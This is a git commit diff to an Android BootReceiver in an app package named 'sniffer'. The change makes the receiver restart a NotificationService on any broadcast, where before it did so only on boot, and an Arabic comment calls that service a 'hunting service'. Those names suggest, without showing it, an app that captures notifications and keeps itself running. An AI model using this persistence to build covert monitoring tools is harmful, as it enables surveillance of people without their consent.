325f5b6b190f055665c4cc393188da3634dd3ff5
safetyIraq <paidhydr@gmail.com>
2026-03-18 13:48:48 +0300

    Update BootReceiver.java

--- app/src/main/java/com/v8/global/sniffer/BootReceiver.java
+++ app/src/main/java/com/v8/global/sniffer/BootReceiver.java
@@ -1,22 +1,12 @@
 package com.v8.global.sniffer;
-
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
-
 public class BootReceiver extends BroadcastReceiver {
-    @Override
-    public void onReceive(Context context, Intent intent) {
-        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
-            // إعادة تشغيل خدمة الصيد تلقائياً
-            Intent i = new Intent(context, NotificationService.class);
-            
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(i);
-            } else {
-                context.startService(i);
-            }
-        }
+    @Override public void onReceive(Context context, Intent intent) {
+        Intent i = new Intent(context, NotificationService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(i);
+        else context.startService(i);
     }
 }
